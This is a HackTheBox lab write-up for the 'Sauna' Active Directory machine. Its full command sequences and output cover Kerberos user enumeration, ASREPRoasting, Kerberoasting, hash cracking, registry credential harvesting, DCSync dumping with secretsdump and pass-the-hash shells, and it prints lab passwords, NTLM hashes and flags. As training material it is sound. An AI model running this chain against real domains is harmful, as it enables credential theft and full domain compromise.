# HTB Writeup — Sauna
**Difficulty:** Easy | **OS:** Windows | **Category:** Active Directory  
**Author:** nt0wl | **Date:** June 2026  
**Flags:** `user: 889534d00ed979ac1a3b21539a947d9d` | `root: 646161907c289a0a40a0b42e58130ff8`

---

## Overview

Sauna is an Easy-rated Windows Active Directory machine on HackTheBox. The attack chain demonstrates a realistic AD compromise path: open-source intelligence gathering from a web application leads to ASREPRoasting a domain user, which grants an initial foothold via WinRM. From there, local registry enumeration uncovers AutoLogon credentials for a service account with DCSync privileges, allowing a full domain compromise via Pass-the-Hash.

**Attack Chain Summary:**
```
Web OSINT → Username Enumeration → ASREPRoast → Foothold (WinRM)
→ Registry AutoLogon Creds → DCSync → Pass-the-Hash → Domain Admin
```

---

## Reconnaissance

### Nmap Full Port Scan

```bash
nmap -sC -sV -p- --open -oA nmap/sauna 10.129.95.180
```

**Key findings:**

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Confirms Domain Controller |
| 80 | HTTP | Microsoft IIS 10.0 — Egotistical Bank |
| 88 | Kerberos | Attack surface for AS-REP/Kerberoast |
| 389/3268 | LDAP | Domain: `EGOTISTICAL-BANK.LOCAL` |
| 445 | SMB | Message signing required |
| 5985 | WinRM | Remote management — shell access if creds found |

**Domain identified:** `EGOTISTICAL-BANK.LOCAL`  
**Hostname:** `SAUNA`  
**OS:** Windows Server 2019

> The presence of ports 53, 88, 389, and 3268 together is a reliable indicator of a Domain Controller. Port 5985 (WinRM) is immediately noted as a potential shell vector once credentials are obtained.

Add the domain to `/etc/hosts`:
```bash
echo "10.129.95.180 EGOTISTICAL-BANK.LOCAL sauna.egotistical-bank.local" >> /etc/hosts
```

### Web Enumeration

Browsing to `http://10.129.95.180` reveals a corporate bank website for **Egotistical Bank**. The "Meet the Team" page at `/about.html` exposes six employee names — valuable for generating AD username candidates.

**Employees identified:**
- Fergus Smith
- Hugo Bear
- Steven Kerb
- Shaun Coins
- Bowie Taylor
- Sophie Driver

Directory fuzzing with ffuf revealed only static asset directories (Images, css, fonts) — no significant web content beyond the team page.

```bash
ffuf -c -u http://egotistical-bank.local/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404
```

---

## Username Enumeration

### Generating Username Candidates

Using `username-anarchy` to generate all common AD username format variations from the harvested names:

```bash
# Create names input file
cat > names.txt << EOF
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
EOF

# Generate all format variations
./username-anarchy -i names.txt > users.txt
# Output: 88 username candidates
```

Common AD username formats generated include:
- `fsmith` (first initial + last) ← most common in real environments
- `fergus.smith`
- `f.smith`
- `smithf`
- `fergus`

### Kerbrute — Valid User Enumeration

Kerberos leaks username validity through different error codes:
- `KDC_ERR_C_PRINCIPAL_UNKNOWN` = user does not exist
- `KDC_ERR_PREAUTH_REQUIRED` = user EXISTS (pre-auth required)
- Hash returned = user exists AND ASREPRoastable

```bash
./kerbrute_linux_amd64 userenum \
  -d EGOTISTICAL-BANK.LOCAL \
  --dc 10.129.95.180 \
  users.txt
```

**Result:**
```
[+] VALID USERNAME: fsmith@EGOTISTICAL-BANK.LOCAL
```

One valid user confirmed: `fsmith` (Fergus Smith), using the `flast` format.

---

## Initial Access

### ASREPRoasting — fsmith

ASREPRoasting targets accounts with **"Do not require Kerberos preauthentication"** enabled. When this flag is set, the KDC returns a TGT encrypted with the user's password hash — no authentication required to request it.

```bash
impacket-GetNPUsers \
  -no-pass \
  -dc-ip 10.129.95.180 \
  'EGOTISTICAL-BANK.LOCAL/fsmith'
```

**Result:** AS-REP hash received for `fsmith`:
```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:72c9e936...e898dd
```

### Hash Cracking — Hashcat Mode 18200

```bash
hashcat -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt
```

**Cracked in ~1 second:**
```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...:Thestrokes23
```

**Credentials:** `fsmith : Thestrokes23`

### WinRM Shell — fsmith

Validating credentials across services:

```bash
# Confirm WinRM access
nxc winrm 10.129.95.180 -u fsmith -p 'Thestrokes23'
# Result: [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)

# Check SMB shares
nxc smb 10.129.95.180 -u fsmith -p 'Thestrokes23' --shares
```

Gaining shell:
```bash
evil-winrm -i 10.129.95.180 -u fsmith -p 'Thestrokes23'
```

**User flag retrieved:**
```
*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
889534d00ed979ac1a3b21539a947d9d
```

---

## Lateral Movement

### Kerberoasting — HSmith

With valid credentials, querying for Kerberoastable accounts (SPNs):

```bash
# Clock skew adjustment required (7 hour difference noted in nmap)
faketime "7+ hours" nxc ldap 10.129.95.180 \
  -u fsmith -p 'Thestrokes23' \
  --kerberoast krbusrs.txt \
  -d EGOTISTICAL-BANK.LOCAL \
  --dns-server 10.129.95.180
```

**Result:** TGS hash obtained for `HSmith`:
```
$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$...$
```

```bash
hashcat -m 13100 krbusrs.txt /usr/share/wordlists/rockyou.txt
```

**Cracked:** `HSmith : Thestrokes23`

> Note: Both HSmith and fsmith share the same password — a credential reuse finding worth noting in a real engagement report.

---

## Privilege Escalation

### Registry AutoLogon Credentials

Reviewing `whoami /all` for fsmith shows a low-privilege user with no interesting group memberships or elevated privileges. Pivoting to local enumeration.

A common misconfiguration in Windows environments is storing AutoLogon credentials in the registry in plaintext. Querying the Winlogon registry key:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Output (critical entries):**
```
DefaultDomainName    REG_SZ    EGOTISTICALBANK
DefaultUserName      REG_SZ    EGOTISTICALBANK\svc_loanmanager
DefaultPassword      REG_SZ    Moneymakestheworldgoround!
```

**Credentials discovered:** `svc_loanmgr : Moneymakestheworldgoround!`

> The registry stores the display name `svc_loanmanager` but the actual sAMAccountName in AD is `svc_loanmgr` — always verify the exact account name.

### DCSync — svc_loanmgr

BloodHound analysis confirms `svc_loanmgr` has **DCSync rights** on the domain object:
- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`
- `DCSync` edge to `EGOTISTICAL-BANK.LOCAL`

DCSync abuses the AD replication protocol — the account requests replication of credential data from the DC as if it were another domain controller, receiving all password hashes without touching LSASS.

```bash
impacket-secretsdump \
  EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.95.180
```

**Full domain credential dump:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:...:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:...:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:...:9cb31797c39a9b170b04058ba2bba48c:::
```

**Administrator NTLM hash:** `823452073d75b9d1cf70ebdf86c7f98e`

### Pass-the-Hash — Administrator

With the Administrator NTLM hash, authenticate directly without cracking:

```bash
evil-winrm -i 10.129.95.180 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

**Root flag retrieved:**
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
646161907c289a0a40a0b42e58130ff8
```

---

## Full Attack Chain

```
[Web App] Meet The Team page
        ↓
[OSINT] 6 employee names harvested
        ↓
[username-anarchy] 88 username candidates generated
        ↓
[Kerbrute] fsmith@EGOTISTICAL-BANK.LOCAL validated
        ↓
[ASREPRoast] krb5asrep$23 hash obtained (no creds required)
        ↓
[Hashcat -m 18200] fsmith:Thestrokes23 cracked
        ↓
[WinRM] Shell as fsmith → user.txt
        ↓
[Kerberoast] HSmith TGS hash → Thestrokes23 (credential reuse)
        ↓
[Registry] svc_loanmgr:Moneymakestheworldgoround! in Winlogon
        ↓
[DCSync] Full domain hash dump via impacket-secretsdump
        ↓
[Pass-the-Hash] Administrator shell → root.txt
```

---

## Key Takeaways

**ASREPRoasting** is effective against accounts with pre-authentication disabled — requires only a valid username, no credentials. Hash mode `18200` in hashcat.

**Kerberoasting** requires valid domain credentials but targets any account with a SPN registered. Hash mode `13100` in hashcat.

**AutoLogon credentials** stored in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` are a common finding in Windows environments where admins configured automatic login for service accounts.

**DCSync** requires `DS-Replication-Get-Changes-All` on the domain object. Exploitable with `impacket-secretsdump` remotely — no need for code execution on the DC.

**Pass-the-Hash** works against NTLM authentication — NTLM hashes can be used directly without cracking, making DCSync a full domain compromise primitive.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| ffuf | Web directory and subdomain fuzzing |
| username-anarchy | AD username format generation |
| kerbrute | Kerberos username validation |
| impacket-GetNPUsers | ASREPRoasting |
| hashcat | Offline password cracking |
| netexec (nxc) | Credential validation, SMB/LDAP/WinRM enum |
| evil-winrm | WinRM shell |
| impacket-secretsdump | DCSync / credential dumping |
| BloodHound/bloodhound-python | AD attack path visualization |

---

*Written by nt0wl — [9t0wl.github.io](https://9t0wl.github.io)*
